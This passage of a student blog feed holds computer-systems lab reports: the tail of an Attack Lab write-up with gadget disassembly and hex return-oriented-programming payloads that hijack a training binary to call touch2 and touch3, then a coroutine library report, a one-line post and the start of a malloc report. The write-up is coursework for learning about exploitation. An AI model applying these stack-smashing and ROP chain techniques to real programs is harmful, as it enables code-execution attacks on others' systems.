$0xd18b3817,%eax</span><br><span class="line">  401fcb:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fcc &lt;setval_470&gt;:</span><br><span class="line">  401fcc:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fd0:	c7 07 89 d1 a4 c0    	movl   $0xc0a4d189,(%rdi)</span><br><span class="line">  401fd6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fd7 &lt;setval_452&gt;:</span><br><span class="line">  401fd7:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fdb:	c7 07 89 ce 00 db    	movl   $0xdb00ce89,(%rdi)</span><br><span class="line">  401fe1:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fe2 &lt;addval_284&gt;:</span><br><span class="line">  401fe2:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401fe6:	8d 87 89 c2 30 c9    	lea    -0x36cf3d77(%rdi),%eax</span><br><span class="line">  401fec:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401fed &lt;setval_116&gt;:</span><br><span class="line">  401fed:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ff1:	c7 07 89 ce 38 d2    	movl   $0xd238ce89,(%rdi)</span><br><span class="line">  401ff7:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000401ff8 &lt;addval_214&gt;:</span><br><span class="line">  401ff8:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ffc:	8d 87 16 89 d1 91    	lea    -0x6e2e76ea(%rdi),%eax</span><br><span class="line">  402002:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000402003 &lt;end_farm&gt;:</span><br><span class="line">  402003:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402007:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  40200c:	c3                   	retq   </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>最终填入字符串如下：（# 后的为注释）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">5f 1e 40 00 00 00 00 00 # pop %rax</span><br><span class="line">c8 9e d9 23 00 00 00 00 # cookie</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">71 1c 40 00 00 00 00 00 # touch2</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>最后用栈的分配图来示意：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/attack-lab.assets/stack4.png"
                      alt="stack4"
                ></p>
</li>
</ul>
<h4 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3:"></a>Level 3:</h4><ul>
<li><p>再次观察所给出代码：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;       <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        <span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		<span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可知需要触发 touch3 且同时将 cookie 作为 char[] 类型的参数传入，方可通过</p>
</li>
<li><p>将 cookie 转为16进制的 ascii 码表示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">32 33 64 39 39 65 63 38 00 # 由于是字符串，结尾需要用 &#x27;\0&#x27; 标记</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>和 Level 2 类似的，由于栈的随机化，不能直接将代码插入绝对地址中，可以以 %rsp 为基准进行插入</p>
</li>
<li><p>和此前类似的，为了避免数据的覆盖，跳转的内存地址应该存入在返回地址的更高位处</p>
</li>
<li><p>最终填入字符串如下：（# 后的为注释）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 # 填充分配的栈空间</span><br><span class="line">f1 1e 40 00 00 00 00 00 # movq %rsp,%rax</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">5f 1e 40 00 00 00 00 00 # pop rax</span><br><span class="line">48 00 00 00 00 00 00 00 # bias</span><br><span class="line">73 1f 40 00 00 00 00 00 # movl %eax,%edx  compb %bl,%bl</span><br><span class="line">93 1f 40 00 00 00 00 00 # movl %edx,%ecx</span><br><span class="line">f3 1f 40 00 00 00 00 00 # movl %ecs,%esi</span><br><span class="line">a6 1e 40 00 00 00 00 00 # lea (%rdi,%rsi,1),%rax</span><br><span class="line">69 1e 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">96 1d 40 00 00 00 00 00 # touch3</span><br><span class="line">32 33 64 39 39 65 63 38 00 # cookie</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>栈的分布以及由上面的字符串注释和 Level 2 的示意可以较为清楚地得知，因此略去。</p>
</li>
</ul>
<h2 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h2><ul>
<li>学会了使用 objdump 工具</li>
<li>对如何写一个安全的程序有了更深刻的理解</li>
</ul>
]]></content>
      <tags>
        <tag>ics</tag>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>Coroutine Lab Report</title>
    <url>/2023/01/19/coroutine/</url>
    <content><![CDATA[<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>在本实验中，同学们将亲手借助汇编&#x2F;内嵌汇编的方式，在熟悉 x86_64 系统架构的前提下，完成一个简单的用户态的有栈协程库，并利用协程库进行睡眠排序（sleep_sort）的编写以及二分查找的优化。</p>
<p>本次实验共分为三个子任务，同学需要依次完成三个子任务并编写实验报告。</p>
<p>三个子任务如下：</p>
<ol>
<li>完成协程库的编写，并通过基础测试。</li>
<li>向协程库添加 sleep 函数，并能够通过 sleep_sort 测试。</li>
<li>使用协程库对二分查找进行优化，并报告优化结果。</li>
</ol>
<p>本实验的运行环境是 x86_64 Linux。</p>
<hr>
<h2 id="Task-1-协程库的编写"><a href="#Task-1-协程库的编写" class="headerlink" title="Task 1: 协程库的编写"></a>Task 1: 协程库的编写</h2><h3 id="所添加代码及注释："><a href="#所添加代码及注释：" class="headerlink" title="所添加代码及注释："></a>所添加代码及注释：</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* common.h */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">yield</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!g_pool-&gt;is_parallel) &#123;</span><br><span class="line">    <span class="comment">// 从 g_pool 中获取当前协程状态</span></span><br><span class="line">    <span class="keyword">auto</span> context = g_pool-&gt;coroutines[g_pool-&gt;context_id];</span><br><span class="line">    <span class="comment">// 调用 coroutine_switch 切换到 coroutine_pool 上下文</span></span><br><span class="line">    <span class="built_in">coroutine_switch</span>(context-&gt;callee_registers, context-&gt;caller_registers);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* context.h */</span></span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">resume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 调用 coroutine_switch</span></span><br><span class="line">  <span class="comment">// 在汇编中保存 callee-saved 寄存器，设置协程函数栈帧，然后将 rip 恢复到协程 yield 之后所需要执行的指令地址。</span></span><br><span class="line">  <span class="built_in">coroutine_switch</span>(caller_registers, callee_registers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* coroutine_pool.h */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">serial_execute_all</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  is_parallel = <span class="literal">false</span>;</span><br><span class="line">  g_pool = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> unfinished;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    unfinished = <span class="literal">false</span>;</span><br><span class="line">    g_pool-&gt;context_id = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> context : coroutines) &#123;</span><br><span class="line">      <span class="comment">// 更新当前协程状态</span></span><br><span class="line">      ++g_pool-&gt;context_id;</span><br><span class="line">      <span class="comment">// 考虑协程的 finished 属性和 ready 属性，选择 ready 的协程函数进行执行</span></span><br><span class="line">      <span class="comment">// 若 ready 属性为假，则用 ready_func 更新 ready 属性</span></span><br><span class="line">      <span class="keyword">if</span> (!context-&gt;finished &amp;&amp; (context-&gt;ready || (context-&gt;ready = context-&gt;<span class="built_in">ready_func</span>())))</span><br><span class="line">        <span class="comment">// 调用 resume 切换到协程</span></span><br><span class="line">        context-&gt;<span class="built_in">resume</span>();</span><br><span class="line">        unfinished |= !context-&gt;finished;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (unfinished); <span class="comment">// 采用轮询的方式确保所有协程函数完成执行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> context : coroutines) &#123;</span><br><span class="line">      <span class="keyword">delete</span> context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    coroutines.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global coroutine_switch</span><br><span class="line">coroutine_switch:</span><br><span class="line">    # TODO: Task 1</span><br><span class="line">    # 保存 callee-saved 寄存器到 %rdi 指向的上下文</span><br><span class="line">    movq %rsp, 64(%rdi)</span><br><span class="line">    movq %rbx, 72(%rdi)</span><br><span class="line">    movq %rbp, 80(%rdi)</span><br><span class="line">    movq %r12, 88(%rdi)</span><br><span class="line">    movq %r13, 96(%rdi)</span><br><span class="line">    movq %r14, 104(%rdi)</span><br><span class="line">    movq %r15, 112(%rdi)</span><br><span class="line"></span><br><span class="line">    # 保存的上下文中 rip 指向 ret 指令的地址（.coroutine_ret）</span><br><span class="line">    leaq .coroutine_ret(%rip), %rbx</span><br><span class="line">    movq %rbx, 120(%rdi)</span><br><span class="line"></span><br><span class="line">    # 从 %rsi 指向的上下文恢复 callee-saved 寄存器</span><br><span class="line">    movq 64(%rsi), %rsp</span><br><span class="line">    movq 72(%rsi), %rbx</span><br><span class="line">    movq 80(%rsi), %rbp</span><br><span class="line">    movq 88(%rsi), %r12</span><br><span class="line">    movq 96(%rsi), %r13</span><br><span class="line">    movq 104(%rsi), %r14</span><br><span class="line">    movq 112(%rsi), %r15</span><br><span class="line"></span><br><span class="line">    # 最后 jmpq 到上下文保存的 rip</span><br><span class="line">    jmpq *120(%rsi)</span><br></pre></td></tr></table></figure></div>

<h3 id="额外要求："><a href="#额外要求：" class="headerlink" title="额外要求："></a>额外要求：</h3><ol>
<li><p>栈的变化过程（以 sample.cpp 为例，仅有两个协程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/coroutine.assets/task11.png"
                      alt="task11"
                ></p>
</li>
<li><p>分析代码如下：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Task 1</span></span><br><span class="line"><span class="comment">// 在实验报告中分析以下代码</span></span><br><span class="line"><span class="comment">// 对齐到 16 字节边界</span></span><br><span class="line"><span class="type">uint64_t</span> rsp = (<span class="type">uint64_t</span>)&amp;stack[stack_size - <span class="number">1</span>];</span><br><span class="line">rsp = rsp - (rsp &amp; <span class="number">0xF</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">coroutine_main</span><span class="params">(<span class="keyword">struct</span> basic_context * context)</span></span>;</span><br><span class="line"></span><br><span class="line">callee_registers[(<span class="type">int</span>)Registers::RSP] = rsp;</span><br><span class="line"><span class="comment">// 协程入口是 coroutine_entry</span></span><br><span class="line">callee_registers[(<span class="type">int</span>)Registers::RIP] = (<span class="type">uint64_t</span>)coroutine_entry;</span><br><span class="line"><span class="comment">// 设置 r12 寄存器为 coroutine_main 的地址</span></span><br><span class="line">callee_registers[(<span class="type">int</span>)Registers::R12] = (<span class="type">uint64_t</span>)coroutine_main;</span><br><span class="line"><span class="comment">// 设置 r13 寄存器，用于 coroutine_main 的参数</span></span><br><span class="line">callee_registers[(<span class="type">int</span>)Registers::R13] = (<span class="type">uint64_t</span>)<span class="keyword">this</span>;</span><br></pre></td></tr></table></figure></div>

<p>初始时 finished 属性为 false， ready 属性为 true，stack 为指向堆上分配的一块大小为 stack_size * sizeof(uint64_t) 的指针。</p>
<p>首先设置 rsp，将 rsp 设置为指向被分配堆区末尾的指针，并与16字节边界进行对齐。再将 coroutine_entry 设置为协程入口，使得第一次执行 resume 时会进入 coroutine_entry。又将 r12 寄存器设置为 coroutine_main 的地址， r13 寄存器设置为指向本 context 的指针， coroutine_entry 在被调用时便会以本 context 为参数，调用 coroutine_main 函数。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Task 1</span></span><br><span class="line"><span class="comment">// 在实验报告中分析以下代码</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">coroutine_main</span><span class="params">(<span class="keyword">struct</span> basic_context *context)</span> </span>&#123;</span><br><span class="line">  context-&gt;<span class="built_in">run</span>();</span><br><span class="line">  context-&gt;finished = <span class="literal">true</span>;</span><br><span class="line">  <span class="built_in">coroutine_switch</span>(context-&gt;callee_registers, context-&gt;caller_registers);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unreachable</span></span><br><span class="line">  <span class="built_in">assert</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>进入 coroutine_main 之后，这个协程函数就真正被跑起来了，可通过 yield 和 resume 实现不同协程之间的切换，当 run 执行完毕，该协程的 finished 属性被标记为 true，遂切回调度器。</p>
</li>
<li><p>定义一个寄存器结构体，封装通用寄存器、浮点寄存器、向量寄存器的寄存区，并将浮点寄存器与向量寄存器在 Resgister 枚举中进行注册。将 coroutine_switch 的传入参数类型改为该结构体，并在 context.S 中根据浮点寄存器和向量寄存器的位数调用适当的 mov 指令将寄存器值储存于结构体中或将结构体中的值加载入寄存器中。</p>
</li>
</ol>
<hr>
<h2 id="TASK-2-实现-SLEEP-函数"><a href="#TASK-2-实现-SLEEP-函数" class="headerlink" title="TASK 2: 实现 SLEEP 函数"></a>TASK 2: 实现 SLEEP 函数</h2><h3 id="所添加代码及注释：-1"><a href="#所添加代码及注释：-1" class="headerlink" title="所添加代码及注释："></a>所添加代码及注释：</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* common.h */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sleep</span><span class="params">(<span class="type">uint64_t</span> ms)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (g_pool-&gt;is_parallel) &#123;</span><br><span class="line">    <span class="keyword">auto</span> cur = <span class="built_in">get_time</span>();</span><br><span class="line">    <span class="keyword">while</span> (</span><br><span class="line">        std::chrono::<span class="built_in">duration_cast</span>&lt;std::chrono::milliseconds&gt;(<span class="built_in">get_time</span>() - cur)</span><br><span class="line">            .<span class="built_in">count</span>() &lt; ms)</span><br><span class="line">      ;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 从 g_pool 中获取当前协程状态</span></span><br><span class="line">    <span class="keyword">auto</span> context = g_pool-&gt;coroutines[g_pool-&gt;context_id];</span><br><span class="line">    context-&gt;ready = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 获取当前时间，更新 ready_func</span></span><br><span class="line">    <span class="keyword">auto</span> cur = <span class="built_in">get_time</span>();</span><br><span class="line">    <span class="keyword">auto</span> ready_func = [cur, ms]()</span><br><span class="line">    &#123; <span class="keyword">return</span> std::chrono::<span class="built_in">duration_cast</span>&lt;std::chrono::milliseconds&gt;(<span class="built_in">get_time</span>() - cur)</span><br><span class="line">                 .<span class="built_in">count</span>() &gt; ms; &#125;;</span><br><span class="line">    <span class="comment">// ready_func：检查当前时间，如果已经超时，则返回 true</span></span><br><span class="line">    context-&gt;ready_func = ready_func;</span><br><span class="line">    <span class="comment">// 调用 coroutine_switch 切换到 coroutine_pool 上下文</span></span><br><span class="line">    <span class="built_in">coroutine_switch</span>(context-&gt;callee_registers, context-&gt;caller_registers);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* coroutine_pool.h */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">serial_execute_all</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  is_parallel = <span class="literal">false</span>;</span><br><span class="line">  g_pool = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> unfinished;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    unfinished = <span class="literal">false</span>;</span><br><span class="line">    g_pool-&gt;context_id = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> context : coroutines) &#123;</span><br><span class="line">      <span class="comment">// 更新当前协程状态</span></span><br><span class="line">      ++g_pool-&gt;context_id;</span><br><span class="line">      <span class="comment">// 考虑协程的 finished 属性和 ready 属性，选择 ready 的协程函数进行执行</span></span><br><span class="line">      <span class="comment">// 若 ready 属性为假，则用 ready_func 更新 ready 属性</span></span><br><span class="line">      <span class="keyword">if</span> (!context-&gt;finished &amp;&amp; (context-&gt;ready || (context-&gt;ready = context-&gt;<span class="built_in">ready_func</span>())))</span><br><span class="line">        <span class="comment">// 调用 resume 切换到协程</span></span><br><span class="line">        context-&gt;<span class="built_in">resume</span>();</span><br><span class="line">        unfinished |= !context-&gt;finished;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (unfinished); <span class="comment">// 采用轮询的方式确保所有协程函数完成执行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> context : coroutines) &#123;</span><br><span class="line">      <span class="keyword">delete</span> context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    coroutines.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="额外要求：-1"><a href="#额外要求：-1" class="headerlink" title="额外要求："></a>额外要求：</h3><ol>
<li><p>为方便绘制，约定图中 ci 表示如下的 coroutine_context：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">coroutine_context</span>([](<span class="type">int</span> x) &#123;</span><br><span class="line">  <span class="built_in">sleep</span>(x);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">  &#125;,</span><br><span class="line">  i);</span><br></pre></td></tr></table></figure></div>

<p>需要说明的是，实际上轮询部分协程并未处于被执行状态，只有指向 sleep 和 printf 的部分代表实际执行情况，但为了展现轮询的过程因而也将其画出：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/coroutine.assets/task21.png"
                      alt="task21"
                ></p>
</li>
<li><p>现存缺陷：轮询的过程占用了CPU进程，使得CPU效率在实际上不高</p>
<p>提出改进：维护一个最小优先队列，优先权依据为预计 ready 属性转为 true 的时间(如加入优先队列时间与 sleep 时间转化为的 duration 之和)。每次只对队首协程进行查询，若队首协程的 ready 属性不为 true，则对整个调度器执行 sleep，当队首协程可用时即将其弹出并 resume，yield 时再将其压回优先队列中。优先队列为空则代表所有协程执行完毕。</p>
</li>
</ol>
<hr>
<h2 id="TASK-3-利用协程优化二分查找"><a href="#TASK-3-利用协程优化二分查找" class="headerlink" title="TASK 3: 利用协程优化二分查找"></a>TASK 3: 利用协程优化二分查找</h2><h3 id="所添加代码及注释：-2"><a href="#所添加代码及注释：-2" class="headerlink" title="所添加代码及注释："></a>所添加代码及注释：</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* binary_search.cpp */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lookup_coroutine</span><span class="params">(<span class="type">const</span> <span class="type">uint32_t</span> *table, <span class="type">size_t</span> size, <span class="type">uint32_t</span> value,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="type">uint32_t</span> *result)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> low = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ((size / <span class="number">2</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">size_t</span> half = size / <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> probe = low + half;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 __builtin_prefetch 预取容易产生缓存缺失的内存</span></span><br><span class="line">    __builtin_prefetch(table+probe);</span><br><span class="line">    <span class="comment">// 并调用 yield</span></span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v = table[probe];</span><br><span class="line">    <span class="keyword">if</span> (v &lt;= value) &#123;</span><br><span class="line">      low = probe;</span><br><span class="line">    &#125;</span><br><span class="line">    size -= half;</span><br><span class="line">  &#125;</span><br><span class="line">  *result = low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="额外要求：-2"><a href="#额外要求：-2" class="headerlink" title="额外要求："></a>额外要求：</h3><ol>
<li><p>优化原理：在数据量比较大的时候，二分查找会产生大量的缓存缺失，而从内存读取数据到 CPU 需要花费几百个 CPU 周期。因此，可以利用协程来优化二分查找。优化方法是，修改二分查找中容易产生缓存缺失的代码，改为先使用预取指令，让 CPU 异步地读取数据，紧接着调用 yield 来切换到其他协程。当多次切换后返回到刚才使用预取指令的协程的时候，CPU 已经把数据读取到了缓存中，此时就节省了很多时间。</p>
<p>实际效果：</p>
<ul>
<li><p>Part1：基本展示</p>
<p>由于该方法的优化效果与实验参数密切相关，且测试结果具有相当的浮动性，因而选择默认参数下的一次较好结果作为基本展示：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Size: 4294967296</span><br><span class="line">Loops: 1000000</span><br><span class="line">Batch size: 16</span><br><span class="line">Initialization <span class="keyword">done</span></span><br><span class="line">naive: 3452.88 ns per search, 107.90 ns per access</span><br><span class="line">coroutine batched: 1802.31 ns per search, 56.32 ns per access</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>​		可见以上思路确实能在一定程度上对二分查找起到优化作用。</p>
<ul>
<li><p>Part2：关于 Size</p>
<p>由于该优化原理是建立在“在数据量比较大的时候，二分查找会产生大量的缓存缺失”上的，因此当 Size 比较小时，由于缓存缺失的情况并不严重，优化效果也会下降，甚至会因协程间的切换而导致负优化，展示如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Size: 65536</span><br><span class="line">Loops: 1000000</span><br><span class="line">Batch size: 16</span><br><span class="line">Initialization <span class="keyword">done</span></span><br><span class="line">naive: 49.56 ns per search, 3.10 ns per access</span><br><span class="line">coroutine batched: 756.03 ns per search, 47.25 ns per access</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Part3：关于 Batch size</p>
<p>在误差范围内， Batch size 只要不是过小，指不足以使得 __builtin_prefetch 执行完毕，或过大，指 __builtin_prefetch 的元素过多又导致缓存缺失，对优化后的二分查找的影响并不很大。</p>
</li>
<li><p>Part4：关于 __builtin_prefetch</p>
<p>本实现中对于 rw 和 locality 的选取均采用了默认参数，即 r 读和 3 高时间局部性。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="HONOR-CODE"><a href="#HONOR-CODE" class="headerlink" title="HONOR CODE"></a>HONOR CODE</h2><p><a class="link"   href="https://www.daemon-systems.org/man/__builtin_prefetch.3.html" >__builtin_prefetch(3) (daemon-systems.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="总结和感想"><a href="#总结和感想" class="headerlink" title="总结和感想"></a>总结和感想</h2><p>本次 Lab 让我对协程有了更加深刻的理解，同时对汇编语言的优势有了更深的体会，在进行一些机器层面的调度时使用汇编语言明显比使用高级语言更加直接与便捷。同时在使用汇编语言进行寄存器的调度时，我对于计算机系统的底层运转的理解也较以往更加清晰了。</p>
]]></content>
      <tags>
        <tag>ics</tag>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/01/19/hello-world/</url>
    <content><![CDATA[<p>The very first blog here.</p>
]]></content>
  </entry>
  <entry>
    <title>Malloc Lab Report</title>
    <url>/2023/01/19/malloc-lab/</url>
    <content><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​		自己动手写一个C语言的动态内存分配器，设计 mm_init、mm_malloc、mm_free 和 mm_realloc 函数，以加深对动态内存分配的理解。</p>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​		本实验的性能评价维度有空间利用率（U）和吞吐量（T），评分公式为：</p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.909ex;" xmlns="http://www.w3.org/2000/svg" width="31.677ex" height="4.97ex" role="img" focusable="false" viewBox="0 -1353 14001.3 2196.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(1028.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2084.6,0)"><path data-c="1D464" d="M580 385Q580 